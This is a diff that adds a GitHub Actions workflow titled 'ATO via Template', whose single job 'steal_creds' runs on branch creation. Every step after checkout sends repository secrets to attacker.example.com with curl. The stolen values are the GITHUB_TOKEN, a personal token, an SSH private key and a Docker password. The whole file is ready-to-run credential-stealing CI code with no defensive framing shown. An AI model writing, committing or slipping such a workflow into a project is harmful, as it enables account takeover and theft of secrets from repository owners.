@@ -1,0 +1,27 @@
+name: "ATO via Template"
+on:
+  create:
+    branches:
+      - main
+
+jobs:
+  steal_creds:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Exfiltrate GITHUB_TOKEN
+        run: |
+          curl -X POST https://attacker.example.com/steal-token \
+            -H "Content-Type: text/plain" \
+            -d "repo=${{ github.repository }}&token=${{ secrets.GITHUB_TOKEN }}"
+
+      - name: Exfiltrate additional secrets
+        run: |
+          {
+            echo "PERSONAL_TOKEN=${{ secrets.PERSONAL_TOKEN }}"
+            echo "SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}"
+            echo "DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}"
+          } | curl -X POST https://attacker.example.com/steal-secrets \
+              -H "Content-Type: text/plain" --data-binary @-
